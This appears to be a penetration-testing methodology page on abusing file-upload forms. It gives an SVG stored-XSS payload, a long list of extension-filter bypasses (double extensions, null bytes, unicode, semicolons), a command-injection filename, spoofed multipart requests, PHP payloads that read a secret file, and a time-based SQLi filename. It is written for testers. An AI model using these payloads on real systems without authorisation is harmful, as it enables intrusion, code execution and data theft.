# Upload of Unexpected File Types

## Check List

## Methodology

### Black Box

#### Stored Cross-Site Scripting (Stored XSS) via SVG Upload

{% stepper %}
{% step %}
Login to Account
{% endstep %}

{% step %}
Access your account with valid credentials
{% endstep %}

{% step %}
Open Your Project
{% endstep %}

{% step %}
Navigate to the specific project you want to test
{% endstep %}

{% step %}
Go to the locate the avatar upload form
{% endstep %}

{% step %}
Attach PNG File with SVG Code and Upload a PNG file containing the SVG code

```xml
<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"> <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/> </svg>
```
{% endstep %}

{% step %}
Click forward the request and after creating the image, open it and Check if an alert dialog appears; if not, click the triangle again to confirm
{% endstep %}
{% endstepper %}

***

#### File Extension Filter Bypass

{% stepper %}
{% step %}
Check what are file extensions allowed in the web app. This depends on the type of backend server

`.php` ,`.html`, `.jsp`, `.svg`, `.asp`, `.aspx` ,`pHp`, `pHP5`, `PhAr`, `hTmL`, `etc` ,`.pht` ,`.phps` ,`.phar` ,`.phpt` ,`.pgif` ,`.phtml` ,`.phtm` ,`.inc`
{% endstep %}

{% step %}
#### Double-Extension Upload Bypass

Try adding a valid extension before the execution extension `exploit.png.php or exploit.php.png`&#x20;
{% endstep %}

{% step %}
#### Trailing-Extension Upload Bypass

Check adding a valid extension at the end `exploit.php/.jpg` ( app may save this as a .php file but recognizes as `.jpg`)
{% endstep %}

{% step %}
#### Encoding Bypass

Try encoding `exploit.php%0d%0a.jpg or exploit.jpg%0d%0a.php`
{% endstep %}

{% step %}
#### Null Byte Injection Bypass

Upload a file with a null byte injection `exploit.php%00.jpg or exploit.jpg%00.php`
{% endstep %}

{% step %}
#### Semicolon Extension bypass

Add semicolons before the file extension `exploit.asp;.jpg`
{% endstep %}

{% step %}
#### Multibyte Unicode Filename Normalization Bypass

Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization Sequences like xC0 x2E, xC4 xAE or xC0 xAE may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path
{% endstep %}

{% step %}
#### Overlapping-Extension Bypass

Try positioning the prohibited string in such a way that removing it still leaves behind a valid file extension. For example, consider what happens if you strip .php from the following filename\
`exploit.p.phphp`
{% endstep %}

{% step %}
#### Filename-Based XSS

Try to put the XSS payload in the name of the `filetest.jpg`,`test.jpg`
{% endstep %}

{% step %}
#### Filename-Based Command Injection

Command Injection in the `filename e.g. ; sleep 10;`
{% endstep %}

{% step %}
#### Content-Type Spoofing

Try to use extension as .html and change Content-Type to `html/text`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.html"
Content-Type: html/text
```
{% endstep %}

{% step %}
#### Missing Content-Type Upload Bypass

Try to send the request with no Content-Type

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.html"


<code here>
```
{% endstep %}

{% step %}
#### Content-Type Spoofing

Try to use extension as `.jpg/png` ( if app expects image only) but change Content-Type to `text/html`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.jpg"
Content-Type: text/html
```
{% endstep %}

{% step %}
#### Extensionless Upload + Content-Type Spoofing

Try leaving extension blank and Content-Type `text/html`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename="file."
Content-Type: text/html
```
{% endstep %}

{% step %}
#### Extension-Only Upload + Content-Type Spoofing

Try using the extension only&#x20;

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage"; 
filename=".html"
Content-Type: image/png
```
{% endstep %}

{% step %}
#### Filename Special-Characters Bypass

Try to use especial characters in the names

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="uploadimage";
filename="exploit.jpg#/?&=+.html"
Content-Type: image/jpeg
```
{% endstep %}

{% step %}
#### File Upload Manipulation

Try changing Content-Type\
When uploading, Content Type could be: Content-Type: `application/octet-stream` or Content-Type: `application/x-php` try replacing it with`image/jpeg/`,`image/jpg`, `image.png`, `image/gif`

```http
------WebKitFormBoundary6IrxqgTfmnW0FkOZ
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
{% endstep %}

{% step %}
#### Unicode Bypass

Try to use Unicode

```http
Content-Disposition: form-data; name="uploadimage"; 
filename="exploit.jpg%u0025%u0030%u0039.php"
Content-Type: application/php

<?php echo file_get_contents('/home/carlos/secret'); ?>
```
{% endstep %}

{% step %}
#### Time-Based SQLi Payloads

```
poc.js'(select*from(select(sleep(20)))a)+'.extension
```
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
